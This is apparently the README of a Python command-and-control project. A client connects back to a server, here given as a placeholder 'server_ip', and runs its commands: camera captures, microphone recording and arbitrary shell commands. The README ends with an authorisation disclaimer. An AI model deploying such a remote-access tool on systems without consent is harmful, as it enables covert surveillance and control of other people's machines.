# neC2i
# Command and Control (C2) Server and Client

This project implements a basic Command and Control (C2) server and client using Python. The server can send commands to connected clients to perform various actions, such as capturing screenshots, recording audio, changing directories, and executing shell commands. The client receives these commands, executes them, and sends the results back to the server.

## Features

- Capture screenshots from the client's camera.
- Record audio from the client's microphone.
- Execute shell commands on the client.
- Change directories on the client.

## Requirements

- Python 3.x
- OpenCV (`opencv-python`)
- PyAudio (`pyaudio`)

## Setup

### Server

1. Clone the repository and navigate to the project directory.
    git clone https://github.com/enisecur1ty/neC2i.git
    cd repository

2. Run the server script.
    python3 server.py

### Client

1. Clone the repository and navigate to the project directory.
    git clone git clone https://github.com/enisecur1ty/neC2i.git
    cd repository

2. Install the required packages.
    # Create and activate a virtual environment (optional but recommended)
    python -m venv myenv
    source myenv/bin/activate
    
    # Install dependencies
    pip install opencv-python pyaudio

3. Update the server IP address in the client script.
    ```python
    client.connect(("server_ip", 9999))  # Replace 'server_ip' with the actual server IP
    ```

4. Run the client script.
    python3 client.py
    

## Usage

1. Start the server by running `python server.py`.
2. Start the client by running `python client.py` on the client machine.
3. From the server console, you can now send commands to the client. For example:
    - `screenshot` - Captures a screenshot from the client's camera.
    - `record_audio` - Records audio from the client's microphone for 5 seconds.
    - `cd <directory>` - Changes the current directory on the client.
    - Any shell command (e.g., `ls`, `pwd`) - Executes the command on the client.

4. The client will execute the commands and send the results back to the server.

## Ethical Considerations

This project is intended for educational purposes only. Ensure you have proper authorization before running this software on any system. Unauthorized use of this software can lead to serious legal consequences.
